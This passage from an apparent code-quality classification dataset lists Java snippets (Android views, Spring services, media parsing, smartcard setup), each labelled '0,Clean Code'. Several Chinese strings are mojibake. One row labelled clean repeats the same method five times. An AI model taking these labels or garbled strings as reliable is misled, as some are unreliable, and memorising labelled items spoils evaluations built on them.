    int y=getLocationY(peer,i);
    if (ymin > y) {
      ymin=y;
    }
    if (ymax < y) {
      ymax=y;
    }
  }
  bounds[0]=xmin;
  bounds[1]=ymin;
  bounds[2]=xmax - xmin;
  bounds[3]=ymax - ymin;
  return (bounds);
}",0,Clean Code
"public boolean stop(String key){
  if (ObjectUtils.isEmpty(key)) {
    return false;
  }
  boolean result=false;
  if (!ObjectUtils.isEmpty(futureMap.get(key)) && !futureMap.get(key).isCancelled() && !futureMap.get(key).isDone()) {
    result=futureMap.get(key).cancel(false);
    futureMap.remove(key);
    runnableMap.remove(key);
  }
  return result;
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (this == o) {
    return true;
  }
  if (o == null || getClass() != o.getClass()) {
    return false;
  }
  Rule rule=(Rule)o;
  if (rate != rule.rate) {
    return false;
  }
  if (!Objects.equals(id,rule.id)) {
    return false;
  }
  if (!Objects.equals(group,rule.group)) {
    return false;
  }
  if (!Objects.equals(name,rule.name)) {
    return false;
  }
  if (!Objects.equals(appName,rule.appName)) {
    return false;
  }
  if (!Objects.equals(metric,rule.metric)) {
    return false;
  }
  if (!Objects.equals(tags,rule.tags)) {
    return false;
  }
  if (!Objects.equals(aggregator,rule.aggregator)) {
    return false;
  }
  if (!Objects.equals(durationCondition,rule.durationCondition)) {
    return false;
  }
  if (!Objects.equals(noDataCondition,rule.noDataCondition)) {
    return false;
  }
  return Objects.equals(eventCondition,rule.eventCondition);
}
",0,Clean Code
"public static String adjustPath(OpenFileSystemModel model,String path){
  if (path == null) {
    return null;
  }
  path=path.trim();
  if (path.isBlank()) {
    return null;
  }
  if (path.startsWith(""\"""") && path.endsWith(""\"""")) {
    path=path.substring(1,path.length() - 1);
  }
 else   if (path.startsWith(""'"") && path.endsWith(""'"")) {
    path=path.substring(1,path.length() - 1);
  }
  if (model.getFileSystem() == null) {
    return path;
  }
  var shell=model.getFileSystem().getShell();
  if (shell.isEmpty()) {
    return path;
  }
  if (shell.get().getOsType().equals(OsType.WINDOWS) && path.length() == 2 && path.endsWith("":"")) {
    return path + ""\\"";
  }
  return path;
}",0,Clean Code
"public SWMRNibbleArray(){
  this(null,false);
}
public SWMRNibbleArray(final byte[] bytes){
  this(bytes,false);
}
public SWMRNibbleArray(final byte[] bytes,final boolean isNullNibble){
  if (bytes != null && bytes.length != ARRAY_SIZE) {
    throw new IllegalArgumentException(""Data of wrong length: "" + bytes.length);
  }
  this.stateVisible=this.stateUpdating=bytes == null ? (isNullNibble ? INIT_STATE_NULL : INIT_STATE_UNINIT) : INIT_STATE_INIT;
  this.storageUpdating=this.storageVisible=bytes;
}
public SWMRNibbleArray(final byte[] bytes,final int state){
  if (bytes != null && bytes.length != ARRAY_SIZE) {
    throw new IllegalArgumentException(""Data of wrong length: "" + bytes.length);
  }
  if (bytes == null && (state == INIT_STATE_INIT || state == INIT_STATE_HIDDEN)) {
    throw new IllegalArgumentException(""Data cannot be null and have state be initialised"");
  }
  this.stateUpdating=this.stateVisible=state;
  this.storageUpdating=this.storageVisible=bytes;
}
",0,Clean Code
"public static void notifyCaptureStopped(Context ctx,CaptureStats stats){
  if (stats != null)   Log.d(TAG,""notifyCaptureStopped: "" + (stats.pkts_sent + stats.pkts_rcvd) + "" pkts"");
  if ((mStarterApp != null) && (mReceiverClass != null)) {
    Log.d(TAG,""Notifying receiver"");
    Intent intent=new Intent(ACTION_NOTIFY_STATUS);
    intent.putExtra(""running"",false);
    if (stats != null)     putStats(intent,stats);
    intent.setComponent(new ComponentName(mStarterApp.getPackageName(),mReceiverClass));
    try {
      ctx.sendBroadcast(intent);
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
  }
  mStarterApp=null;
  mReceiverClass=null;
}
",0,Clean Code
"public WView findViewById(String viewId){
  if (viewId == null) {
    return null;
  }
  if (this.getIdStr() != null && this.getIdStr().contains(viewId) && getRealVisiblity() == 'V') {
    return this;
  }
  for (int i=0; i < getChildCount(); i++) {
    final WView sameView=getChildAt(i).findViewById(viewId);
    if (sameView != null) {
      return sameView;
    }
  }
  return null;
}",0,Clean Code
"/** 
 * {@inheritDoc} 
 */
@Override public OpenCVImage resize(int width,int height,boolean copy){
  if (!copy && image.width() == width && image.height() == height) {
    return this;
  }
  Mat resized=new Mat();
  Imgproc.resize(image,resized,new Size(width,height));
  return new OpenCVImage(resized);
}
",0,Clean Code
"@Override int getCurrentItemTop(){
  if (listView.getChildCount() <= 1) {
    return Integer.MAX_VALUE;
  }
  View child=listView.getChildAt(1);
  if (child == null) {
    return Integer.MAX_VALUE;
  }
  RecyclerListView.Holder holder=(RecyclerListView.Holder)listView.findContainingViewHolder(child);
  int top=(int)child.getY() - AndroidUtilities.dp(8);
  int newOffset=top > 0 && holder != null && holder.getAdapterPosition() == 1 ? top : 0;
  if (top >= 0 && holder != null && holder.getAdapterPosition() == 1) {
    newOffset=top;
  }
  return newOffset + AndroidUtilities.dp(25);
}",0,Clean Code
"@Override @RequestMapping(value=""thirdPartyPaskUpdate"",method=RequestMethod.PUT) public ResponseResult thirdPartyPaskUpdate(@Validated @RequestBody CfLogisticsTaskForm cfLogisticsTaskForm) throws Exception {
  if (StringUtils.isEmpty(cfLogisticsTaskForm.getSignType()) || StringUtils.isEmpty(cfLogisticsTaskForm.getSign()) || cfLogisticsTaskForm.getKeyId() == null) {
    return new ResponseResult(CommonCode.INVALID_PARAM,null,""keyId/signType/sign 杩欎笁涓瓧娈甸兘瑕佹彁渚�"");
  }
  checkSign(cfLogisticsTaskForm);
  CfLogisticsFactory cfLogisticsFactory=null;
  if (StringUtils.isNotEmpty(cfLogisticsTaskForm.getFactory())) {
    CfLogisticsFactoryQuery cfLogisticsFactoryQuery=new CfLogisticsFactoryQuery();
    cfLogisticsFactoryQuery.setFactoryName(cfLogisticsTaskForm.getLogisticsStorehouseName());
    List<CfLogisticsFactory> cfLogisticsFactoryList=cfLogisticsFactoryService.getListByQuery(cfLogisticsFactoryQuery);
    if (cfLogisticsFactoryList != null && cfLogisticsFactoryList.size() > 0) {
      cfLogisticsFactory=cfLogisticsFactoryList.get(0);
    }
  }
 else {
    cfLogisticsFactory=cfLogisticsFactoryService.findById(cfLogisticsTaskForm.getFactoryId());
  }
  if (cfLogisticsFactory == null) {
    return new ResponseResult(CommonCode.NO_MORE_DATAS,null,""鎸囧畾鐨勫伐鍘備笉瀛樺湪"");
  }
  CfLogisticsTask cfLogisticsTask=new CfLogisticsTask();
  BeanUtils.copyProperties(cfLogisticsTaskForm,cfLogisticsTask);
  cfLogisticsTask.setEditerUid("""");
  cfLogisticsTask.setFactoryId(cfLogisticsFactory.getId());
  CfLogisticsTask lastCfLogisticsTask=cfLogisticsTaskService.update(cfLogisticsTask);
  return new ResponseResult(CommonCode.SUCCESS,lastCfLogisticsTask);
}",0,Clean Code
"public TreeNode lowestCommonAncestor(TreeNode root,TreeNode p,TreeNode q){
  if (root == null || root == p || root == q)   return root;
  TreeNode left=lowestCommonAncestor(root.left,p,q);
  TreeNode right=lowestCommonAncestor(root.right,p,q);
  if (left == null && right == null)   return null;
  if (left == null)   return right;
  if (right == null)   return left;
  return root;
}
",0,Clean Code
"@Override public View onCreateView(LayoutInflater inflater,ViewGroup container,Bundle savedInstanceState){
  if (getChildFragmentManager().findFragmentById(R.id.scale_frame) == null) {
    mHeadersFragment=onCreateHeadersFragment();
    createMainFragment(mAdapter,mSelectedPosition);
    FragmentTransaction ft=getChildFragmentManager().beginTransaction().replace(R.id.browse_headers_dock,mHeadersFragment);
    if (mMainFragment != null) {
      ft.replace(R.id.scale_frame,mMainFragment);
    }
 else {
      mMainFragmentAdapter=new MainFragmentAdapter(null);
      mMainFragmentAdapter.setFragmentHost(new FragmentHostImpl());
    }
    ft.commit();
  }
 else {
    mHeadersFragment=(HeadersFragment)getChildFragmentManager().findFragmentById(R.id.browse_headers_dock);
    mMainFragment=getChildFragmentManager().findFragmentById(R.id.scale_frame);
    mIsPageRow=savedInstanceState != null && savedInstanceState.getBoolean(IS_PAGE_ROW,false);
    mSelectedPosition=savedInstanceState != null ? savedInstanceState.getInt(CURRENT_SELECTED_POSITION,0) : 0;
    setMainFragmentAdapter();
  }
  mHeadersFragment.setHeadersGone(!mCanShowHeaders);
  if (mHeaderPresenterSelector != null) {
    mHeadersFragment.setPresenterSelector(mHeaderPresenterSelector);
  }
  mHeadersFragment.setAdapter(mAdapter);
  mHeadersFragment.setOnHeaderViewSelectedListener(mHeaderViewSelectedListener);
  mHeadersFragment.setOnHeaderClickedListener(mHeaderClickedListener);
  View root=inflater.inflate(R.layout.lb_browse_fragment,container,false);
  getProgressBarManager().setRootView((ViewGroup)root);
  mBrowseFrame=(BrowseFrameLayout)root.findViewById(R.id.browse_frame);
  mBrowseFrame.setOnChildFocusListener(mOnChildFocusListener);
  mBrowseFrame.setOnFocusSearchListener(mOnFocusSearchListener);
  installTitleView(inflater,mBrowseFrame,savedInstanceState);
  mScaleFrameLayout=(ScaleFrameLayout)root.findViewById(R.id.scale_frame);
  mScaleFrameLayout.setPivotX(0);
  mScaleFrameLayout.setPivotY(mContainerListAlignTop);
  if (mBrandColorSet) {
    mHeadersFragment.setBackgroundColor(mBrandColor);
  }
  mSceneWithHeaders=TransitionHelper.createScene(mBrowseFrame,new Runnable(){
    @Override public void run(){
      showHeaders(true);
    }
  }
);
  mSceneWithoutHeaders=TransitionHelper.createScene(mBrowseFrame,new Runnable(){
    @Override public void run(){
      showHeaders(false);
    }
  }
);
  mSceneAfterEntranceTransition=TransitionHelper.createScene(mBrowseFrame,new Runnable(){
    @Override public void run(){
      setEntranceTransitionEndState();
    }
  }
);
  return root;
}",0,Clean Code
"private void bindViewSecond(){
  GalleryDetail gd=mGalleryDetail;
  if (gd == null) {
    return;
  }
  if (mThumb == null || mTitle == null || mUploader == null || mCategory == null || mLanguage == null || mPages == null || mSize == null || mPosted == null || mFavoredTimes == null || mRatingText == null || mRating == null || mTorrent == null) {
    return;
  }
  Resources resources=getResources2();
  AssertUtils.assertNotNull(resources);
  if (null == mGalleryInfo) {
    mThumb.load(EhCacheKeyFactory.getThumbKey(gd.gid),gd.thumb);
  }
 else {
    if (useNetWorkLoadThumb) {
      mThumb.load(EhCacheKeyFactory.getThumbKey(gd.gid),gd.thumb);
      useNetWorkLoadThumb=false;
    }
 else {
      mThumb.load(EhCacheKeyFactory.getThumbKey(gd.gid),gd.thumb,false);
    }
  }
  mTitle.setText(EhUtils.getSuitableTitle(gd));
  mUploader.setText(gd.uploader);
  mCategory.setText(EhUtils.getCategory(gd.category));
  mCategory.setTextColor(EhUtils.getCategoryColor(gd.category));
  updateDownloadText();
  mLanguage.setText(gd.language);
  GalleryInfo galleryInfo=getGalleryInfo();
  bindReadProgress(galleryInfo);
  mSize.setText(gd.size);
  mPosted.setText(gd.posted);
  mFavoredTimes.setText(resources.getString(R.string.favored_times,gd.favoriteCount));
  mRatingText.setText(getAllRatingText(gd.rating,gd.ratingCount));
  mRating.setRating(gd.rating);
  updateFavoriteDrawable();
  mTorrent.setText(resources.getString(R.string.torrent_count,gd.torrentCount));
  bindTags(gd.tags);
  bindComments(gd.comments.comments);
  bindPreviews(gd);
}",0,Clean Code
"String getClassName(){
  String className=toFQClassName(owner);
  if (jobDetailsBuilder.getStack().isEmpty()) {
    return findInheritedClassName(className).orElse(className);
  }
  ListIterator objectOnStackIterator=jobDetailsBuilder.getStack().listIterator(jobDetailsBuilder.getStack().size());
  while (objectOnStackIterator.hasPrevious()) {
    Object jobOnStack=objectOnStackIterator.previous();
    if (jobOnStack != null && !jobOnStack.getClass().isSynthetic() && !Proxy.isProxyClass(jobOnStack.getClass())) {
      Class<Object> jobClass=toClass(className);
      if (jobClass.isAssignableFrom(jobOnStack.getClass())) {
        return jobOnStack.getClass().getName();
      }
    }
  }
  return className;
}
",0,Clean Code
"private static long[] getAdGroupTimesUs(List<Float> cuePoints){
  if (cuePoints.isEmpty()) {
    return new long[]{0};
  }
  int count=cuePoints.size();
  long[] adGroupTimesUs=new long[count];
  int adGroupIndex=0;
  for (int i=0; i < count; i++) {
    double cuePoint=cuePoints.get(i);
    if (cuePoint == -1.0) {
      adGroupTimesUs[count - 1]=C.TIME_END_OF_SOURCE;
    }
 else {
      adGroupTimesUs[adGroupIndex++]=(long)(C.MICROS_PER_SECOND * cuePoint);
    }
  }
  Arrays.sort(adGroupTimesUs,0,adGroupIndex);
  return adGroupTimesUs;
}",0,Clean Code
"@Override public void setAllowDrawContent(boolean value){
  super.setAllowDrawContent(value);
  currentAttachLayout.onContainerTranslationUpdated(currentPanTranslationY);
  if (allowDrawContent != value) {
    allowDrawContent=value;
    if (currentAttachLayout == photoLayout && photoLayout != null && !photoLayout.cameraExpanded) {
      photoLayout.pauseCamera(!allowDrawContent || sent);
    }
  }
}
",0,Clean Code
"public Set<String> getIndicesByAlias(String alias) throws Exception {
  GetAliasesRequest request=new GetAliasesRequest(alias);
  RestHighLevelClient hlClient=esClient.getHighLevelClient();
  try {
    GetAliasesResponse response=hlClient.indices().getAlias(request,RequestOptions.DEFAULT);
    RestStatus status=response.status();
    if (status == RestStatus.OK) {
      return response.getAliases().keySet();
    }
 else {
      log.error(String.format(""绱㈠紩鍒悕[%s]鏌ヨ澶辫触:%s"",alias,response.getError()));
      throw new ESIndexDeleteException(String.format(""绱㈠紩鍒悕[%s]鏌ヨ澶辫触:%s"",alias,response.getError()));
    }
  }
 catch (  Exception ex) {
    log.error(String.format(""绱㈠紩鍒悕[%s]鏌ヨ澶辫触:%s"",alias,ex.getMessage()));
    throw new ESIndexException(String.format(""绱㈠紩鍒悕[%s]鏌ヨ澶辫触:%s"",alias,ex.getMessage()));
  }
}
",0,Clean Code
"/** 
 * 璁＄畻浼氬憳绛夌骇
 * @param user           浼氬憳
 * @param userExperience 浼氬憳褰撳墠鐨勭粡楠屽��
 * @return 浼氬憳鏂扮殑绛夌骇锛宯ull琛ㄧず鏃犲彉鍖�
 */
private MemberLevelDO calculateNewLevel(MemberUserDO user,int userExperience){
  List<MemberLevelDO> list=getEnableLevelList();
  if (CollUtil.isEmpty(list)) {
    log.warn(""璁＄畻浼氬憳绛夌骇澶辫触锛氫細鍛樼瓑绾ч厤缃笉瀛樺湪"");
    return null;
  }
  MemberLevelDO matchLevel=list.stream().filter(level -> userExperience >= level.getExperience()).max(Comparator.nullsFirst(Comparator.comparing(MemberLevelDO::getLevel))).orElse(null);
  if (matchLevel == null) {
    log.warn(""璁＄畻浼氬憳绛夌骇澶辫触锛氭湭鎵惧埌浼氬憳{}缁忛獙{}瀵瑰簲鐨勭瓑绾ч厤缃�"",user.getId(),userExperience);
    return null;
  }
  if (ObjectUtil.equal(matchLevel.getId(),user.getLevelId())) {
    return null;
  }
  return matchLevel;
}
",0,Clean Code
"/** 
 * 鏂板璧勬簮瀵艰埅
 * @param resourceNavigateDTO
 * @param currentUser
 * @return
 */
@Override public Boolean create(ResourceNavigateDTO resourceNavigateDTO,UserSsoDTO currentUser){
  if (StringUtils.isBlank(resourceNavigateDTO.getResourceName()) || StringUtils.isBlank(resourceNavigateDTO.getCategory()) || StringUtils.isBlank(resourceNavigateDTO.getDesc())|| StringUtils.isBlank(resourceNavigateDTO.getLink())) {
    throw BusinessException.build(ResponseCode.NOT_EXISTS,""鍙傛暟涓嶅悎瑙�"");
  }
  if (isNameExist(null,resourceNavigateDTO.getResourceName())) {
    throw BusinessException.build(ResponseCode.NAME_EXIST,""璧勬簮瀵艰埅鍚嶉噸澶�"");
  }
  resourceNavigateDTO.setIsDeleted(false);
  resourceNavigateDTO.setCreateUser(currentUser.getUserId());
  resourceNavigateDTO.setUpdateUser(currentUser.getUserId());
  LocalDateTime now=LocalDateTime.now();
  resourceNavigateDTO.setCreateTime(now);
  resourceNavigateDTO.setUpdateTime(now);
  ResourceNavigatePo resourceNavigatePo=ResourceNavigateMS.INSTANCE.toPo(resourceNavigateDTO);
  if (resourceNavigatePoMapper.insertSelective(resourceNavigatePo) <= 0) {
    throw BusinessException.build(ResponseCode.OPERATE_FAIL,""鏂板璧勬簮瀵艰埅澶辫触"");
  }
  return true;
}",0,Clean Code
"/** 
 * Sets a replacement for an individual Android framework resource (in the  {@code android} package).See  {@link #setSystemWideReplacement(String,String,String,Object)}.
 * @param id The ID of the resource which should be replaced.
 * @param replacement The replacement.
 */
public static void setSystemWideReplacement(int id,Object replacement){
  setReplacement(id,replacement,null);
}
/** 
 * Sets a replacement for an individual Android framework resource (in the  {@code android} package).See  {@link #setSystemWideReplacement(String,String,String,Object)}.
 * @deprecated Use {@link #setSystemWideReplacement(String,String,String,Object)} instead.
 * @param fullName The full resource name, e.g. {@code android:string/yes}. See  {@link #getResourceName}.
 * @param replacement The replacement.
 */
@Deprecated public static void setSystemWideReplacement(String fullName,Object replacement){
  int id=getSystem().getIdentifier(fullName,null,null);
  if (id == 0)   throw new NotFoundException(fullName);
  setReplacement(id,replacement,null);
}
/** 
 * Sets a replacement for an individual Android framework resource (in the  {@code android} package).<p>Some resources are part of the Android framework and can be used in any app. They're accessible via  {@link android.R android.R} and are not bound to a specific{@link android.content.res.Resources} instance. Such resources can be replaced in{@link IXposedHookZygoteInit#initZygote initZygote()} for all apps. As there is no{@link XResources} object easily available in that scope, this static method can be usedto set resource replacements. All other details (e.g. how certain types can be replaced) are mentioned in  {@link #setReplacement(String,String,String,Object)}.
 * @param pkg The package name, should always be {@code android} here.See  {@link #getResourcePackageName}.
 * @param type The type name, e.g. {@code string}. See  {@link #getResourceTypeName}.
 * @param name The entry name, e.g. {@code yes}. See  {@link #getResourceEntryName}.
 * @param replacement The replacement.
 */
public static void setSystemWideReplacement(String pkg,String type,String name,Object replacement){
  int id=getSystem().getIdentifier(name,type,pkg);
  if (id == 0)   throw new NotFoundException(pkg + "":"" + type+ ""/""+ name);
  setReplacement(id,replacement,null);
}",0,Clean Code
"protected void introspect(Class<?> cl){
  if (_writeReplace != null)   _writeReplace.setAccessible(true);
  ArrayList<Field> primitiveFields=new ArrayList<Field>();
  ArrayList<Field> compoundFields=new ArrayList<Field>();
  for (; cl != null; cl=cl.getSuperclass()) {
    Field[] fields=cl.getDeclaredFields();
    for (int i=0; i < fields.length; i++) {
      Field field=fields[i];
      if (Modifier.isTransient(field.getModifiers()) || Modifier.isStatic(field.getModifiers()))       continue;
      field.setAccessible(true);
      if (field.getType().isPrimitive() || (field.getType().getName().startsWith(""java.lang."") && !field.getType().equals(Object.class)))       primitiveFields.add(field);
 else       compoundFields.add(field);
    }
  }
  ArrayList<Field> fields=new ArrayList<Field>();
  fields.addAll(primitiveFields);
  fields.addAll(compoundFields);
  _fields=new Field[fields.size()];
  fields.toArray(_fields);
  _fieldSerializers=new FieldSerializer[_fields.length];
  for (int i=0; i < _fields.length; i++) {
    _fieldSerializers[i]=getFieldSerializer(_fields[i].getType());
  }
}",0,Clean Code
"/** 
 * CARD MGMT               
 */
public APDUResponse cardSetup(byte pin_tries0,byte[] pin0){
  SecureRandom random=new SecureRandom();
  byte[] ublk0=new byte[8];
  byte[] ublk1=new byte[8];
  byte[] pin1=new byte[8];
  random.nextBytes(ublk0);
  random.nextBytes(ublk1);
  random.nextBytes(pin1);
  byte ublk_tries0=(byte)0x01;
  byte ublk_tries1=(byte)0x01;
  byte pin_tries1=(byte)0x01;
  return cardSetup(pin_tries0,ublk_tries0,pin0,ublk0,pin_tries1,ublk_tries1,pin1,ublk1);
}
public APDUResponse cardSetup(byte pin_tries0,byte ublk_tries0,byte[] pin0,byte[] ublk0,byte pin_tries1,byte ublk_tries1,byte[] pin1,byte[] ublk1){
  byte[] pin={0x4D,0x75,0x73,0x63,0x6C,0x65,0x30,0x30};
  byte cla=(byte)0xB0;
  byte ins=INS_SETUP;
  byte p1=0;
  byte p2=0;
  int optionsize=0;
  int option_flags=0;
  int offset=0;
  int datasize=16 + pin.length + pin0.length+ pin1.length+ ublk0.length+ ublk1.length+ optionsize;
  byte[] data=new byte[datasize];
  data[offset++]=(byte)pin.length;
  System.arraycopy(pin,0,data,offset,pin.length);
  offset+=pin.length;
  data[offset++]=pin_tries0;
  data[offset++]=ublk_tries0;
  data[offset++]=(byte)pin0.length;
  System.arraycopy(pin0,0,data,offset,pin0.length);
  offset+=pin0.length;
  data[offset++]=(byte)ublk0.length;
  System.arraycopy(ublk0,0,data,offset,ublk0.length);
  offset+=ublk0.length;
  data[offset++]=pin_tries1;
  data[offset++]=ublk_tries1;
  data[offset++]=(byte)pin1.length;
  System.arraycopy(pin1,0,data,offset,pin1.length);
  offset+=pin1.length;
  data[offset++]=(byte)ublk1.length;
  System.arraycopy(ublk1,0,data,offset,ublk1.length);
  offset+=ublk1.length;
  data[offset++]=(byte)00;
  data[offset++]=(byte)32;
  data[offset++]=(byte)00;
  data[offset++]=(byte)32;
  data[offset++]=(byte)0x01;
  data[offset++]=(byte)0x01;
  data[offset++]=(byte)0x01;
  APDUCommand plainApdu=new APDUCommand(cla,ins,p1,p2,data);
  APDUResponse respApdu=this.cardTransmit(plainApdu);
  if (respApdu.getSw() == 0x9000) {
  }
 else {
    log.error(""Error "" + respApdu.toHexString());
  }
  return respApdu;
}",0,Clean Code
"@Subscribe public void bwtSyncStatus(BwtSyncStatusEvent event){
  editConnection.setDisable(false);
  if (connectionService != null && connectionService.isRunning() && event.getProgress() < 100) {
    DateFormat dateFormat=new SimpleDateFormat(""yyyy/MM/dd HH:mm"");
    testResults.appendText(""\nThe connection to the Bitcoin Core node was successful, but it is still syncing and cannot be used yet."");
    testResults.appendText(""\nCurrently "" + event.getProgress() + ""% completed to date ""+ dateFormat.format(event.getTip()));
    testConnection.setGraphic(getGlyph(FontAwesome5.Glyph.QUESTION_CIRCLE,null));
    connectionService.cancel();
  }
}",0,Clean Code
"public Criteria andGmtModifiedNotIn(List<Date> values){
  addCriterion(""gmt_modified not in"",values,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotIn(List<Date> values){
  addCriterion(""gmt_modified not in"",values,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotIn(List<Date> values){
  addCriterion(""gmt_modified not in"",values,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotIn(List<Date> values){
  addCriterion(""gmt_modified not in"",values,""gmtModified"");
  return (Criteria)this;
}
public Criteria andGmtModifiedNotIn(List<Date> values){
  addCriterion(""gmt_modified not in"",values,""gmtModified"");
  return (Criteria)this;
}
",0,Clean Code
"public static JobConfigDTO toDTO(UpsertJobConfigParam upsertJobConfigParam){
  if (upsertJobConfigParam == null) {
    return null;
  }
  JobConfigDTO jobConfigDTO=new JobConfigDTO();
  jobConfigDTO.setId(upsertJobConfigParam.getId());
  jobConfigDTO.setDeployModeEnum(DeployModeEnum.getModel(upsertJobConfigParam.getDeployMode()));
  jobConfigDTO.setJobName(upsertJobConfigParam.getJobName());
  jobConfigDTO.setJobDesc(upsertJobConfigParam.getJobDesc());
  jobConfigDTO.setFlinkRunConfig(upsertJobConfigParam.getFlinkRunConfig());
  jobConfigDTO.setFlinkCheckpointConfig(upsertJobConfigParam.getFlinkCheckpointConfig());
  if (StringUtils.isNotEmpty(upsertJobConfigParam.getFlinkSql()) && (JobTypeEnum.SQL_STREAMING.getCode() == upsertJobConfigParam.getJobType().intValue() || JobTypeEnum.SQL_BATCH.getCode() == upsertJobConfigParam.getJobType().intValue())) {
    jobConfigDTO.setFlinkSql(upsertJobConfigParam.getFlinkSql());
  }
 else {
    jobConfigDTO.setFlinkSql(SystemConstant.SPACE);
  }
  jobConfigDTO.setJobTypeEnum(JobTypeEnum.getJobTypeEnum(upsertJobConfigParam.getJobType()));
  jobConfigDTO.setCustomArgs(upsertJobConfigParam.getCustomArgs());
  jobConfigDTO.setCustomMainClass(upsertJobConfigParam.getCustomMainClass());
  jobConfigDTO.setCustomJarUrl(upsertJobConfigParam.getCustomJarUrl());
  jobConfigDTO.setIsOpen(upsertJobConfigParam.getIsOpen());
  jobConfigDTO.setStatus(JobConfigStatus.getJobConfigStatus(upsertJobConfigParam.getStatus()));
  if (StringUtils.isNotEmpty(upsertJobConfigParam.getExtJarPath())) {
    jobConfigDTO.setExtJarPath(upsertJobConfigParam.getExtJarPath().trim());
  }
 else {
    jobConfigDTO.setExtJarPath(SystemConstant.SPACE);
  }
  jobConfigDTO.setCron(upsertJobConfigParam.getCron());
  if (StringUtils.isNotEmpty(upsertJobConfigParam.getAlarmTypes())) {
    List<AlarmTypeEnum> list=new ArrayList<>();
    String[] types=upsertJobConfigParam.getAlarmTypes().split("","");
    for (    String code : types) {
      AlarmTypeEnum alarmTypeEnum=AlarmTypeEnum.getAlarmTypeEnum(Integer.valueOf(code));
      if (alarmTypeEnum != null) {
        list.add(alarmTypeEnum);
      }
    }
    if (CollectionUtils.isNotEmpty(list)) {
      jobConfigDTO.setAlarmTypeEnumList(list);
    }
  }
  return jobConfigDTO;
}
",0,Clean Code
"public boolean onAuthSuccess(ChannelHandlerContext ctx,ChannelInfo channelInfo,WebSocketServerHandshaker wsHandshaker,FullHttpRequest req){
  Channel channel=channelInfo.getChannel();
  InetSocketAddress address=(InetSocketAddress)channel.localAddress();
  LOGGER.info(""Channel (@ {}: {}) authenticated"",address.getPort(),channel.remoteAddress());
  channelInfo.setAuthenticated(true);
  channelInfo.cancelTimeoutHandler();
  ChannelInfo existingChannelInfo=addSession(channelInfo);
  if (existingChannelInfo != null && existingChannelInfo.getChannelType().equals(ChannelType.APP)) {
    LOGGER.info(""There is already attached idle channel in the session, "" + ""so closing existing one (@ {}: {})"",address.getPort(),existingChannelInfo.getChannel().remoteAddress());
    existingChannelInfo.getChannel().attr(CLOSE_REASON_ATTRIBUTE_KEY).set(CLOSE_REASON_SESSION_LIMIT_EXCEEDED);
    sendCloseMessage(existingChannelInfo,WebSocketCloseStatus.NORMAL_CLOSURE,""There is already attached idle channel in the session, so closing existing one"");
    existingChannelInfo.getChannel().close();
  }
  wsHandshaker.handshake(channel,req);
  return true;
}
",0,Clean Code
"@Override public void doFilterInternal(@NonNull HttpServletRequest httpServletRequest,@NonNull HttpServletResponse httpServletResponse,@NonNull FilterChain filterChain) throws ServletException, IOException {
  if (!polarisContractProperties.isExposure()) {
    String path=httpServletRequest.getServletPath();
    if (path.startsWith(SWAGGER_V2_API_DOC_URL) || path.startsWith(SWAGGER_V3_API_DOC_URL) || path.startsWith(SWAGGER_UI_V2_URL)|| path.startsWith(SWAGGER_UI_V3_URL)|| path.startsWith(SWAGGER_RESOURCE_PREFIX)|| path.startsWith(SWAGGER_WEBJARS_V2_PREFIX)|| path.startsWith(SWAGGER_WEBJARS_V3_PREFIX)) {
      httpServletResponse.setStatus(HttpServletResponse.SC_FORBIDDEN);
      return;
    }
  }
  filterChain.doFilter(httpServletRequest,httpServletResponse);
}",0,Clean Code
"public static Object getField(DynamicMessage dynamicMessage,Descriptors.FieldDescriptor fieldDescriptor,ProtoVisitor.FeatureContext ctx){
  if (ctx.isEnabled(ProtoVisitor.Feature.USE_DEFAULT_VALUE) || fieldDescriptor.isRepeated() || dynamicMessage.hasField(fieldDescriptor)) {
    return dynamicMessage.getField(fieldDescriptor);
  }
  return null;
}
",0,Clean Code
"public void drawViews(Canvas canvas,RectF bounds,float alpha){
  if (!isStory || imageReceiver != null && !imageReceiver.getVisible() || currentParentColumnsCount >= 5) {
    return;
  }
  final float fwidth=bounds.width() + dp(20) * checkBoxProgress;
  final float scale=bounds.width() / fwidth;
  final boolean left=viewsOnLeft(fwidth);
  float a=viewsAlpha.set(drawViews);
  alpha*=a;
  if (alpha < 1) {
    alpha=(float)Math.pow(alpha,8);
  }
  if (a <= 0) {
    return;
  }
  canvas.save();
  canvas.translate(bounds.left,bounds.top);
  canvas.scale(scale,scale,left ? 0 : bounds.width(),bounds.height());
  canvas.clipRect(0,0,bounds.width(),bounds.height());
  float width=dp(18 + 8) + viewsText.getCurrentWidth();
  canvas.translate(left ? dp(5) : bounds.width() - dp(5) - width,dp(1) + bounds.height() - dp(17) - dp(4));
  AndroidUtilities.rectTmp.set(0,0,width,dp(17));
  int oldAlpha=Theme.chat_timeBackgroundPaint.getAlpha();
  Theme.chat_timeBackgroundPaint.setAlpha((int)(oldAlpha * alpha));
  canvas.drawRoundRect(AndroidUtilities.rectTmp,dp(4),dp(4),Theme.chat_timeBackgroundPaint);
  Theme.chat_timeBackgroundPaint.setAlpha(oldAlpha);
  canvas.save();
  canvas.translate(dp(3),(dp(17) - sharedResources.viewDrawable.getBounds().height()) / 2f);
  sharedResources.viewDrawable.setAlpha((int)(255 * imageAlpha * alpha));
  sharedResources.viewDrawable.draw(canvas);
  canvas.restore();
  canvas.translate(dp(4 + 18),0);
  viewsText.setBounds(0,0,(int)width,dp(17));
  viewsText.setAlpha((int)(0xFF * alpha));
  viewsText.draw(canvas);
  canvas.restore();
}",0,Clean Code
"@Override public long open(DataSpec dataSpec) throws IOException {
  transferInitializing(dataSpec);
  this.dataSpec=dataSpec;
  readPosition=(int)dataSpec.position;
  Uri uri=dataSpec.uri;
  String scheme=uri.getScheme();
  if (!SCHEME_DATA.equals(scheme)) {
    throw new ParserException(""Unsupported scheme: "" + scheme);
  }
  String[] uriParts=Util.split(uri.getSchemeSpecificPart(),"","");
  if (uriParts.length != 2) {
    throw new ParserException(""Unexpected URI format: "" + uri);
  }
  String dataString=uriParts[1];
  if (uriParts[0].contains("";base64"")) {
    try {
      data=Base64.decode(dataString,0);
    }
 catch (    IllegalArgumentException e) {
      throw new ParserException(""Error while parsing Base64 encoded string: "" + dataString,e);
    }
  }
 else {
    data=Util.getUtf8Bytes(URLDecoder.decode(dataString,C.ASCII_NAME));
  }
  endPosition=dataSpec.length != C.LENGTH_UNSET ? (int)dataSpec.length + readPosition : data.length;
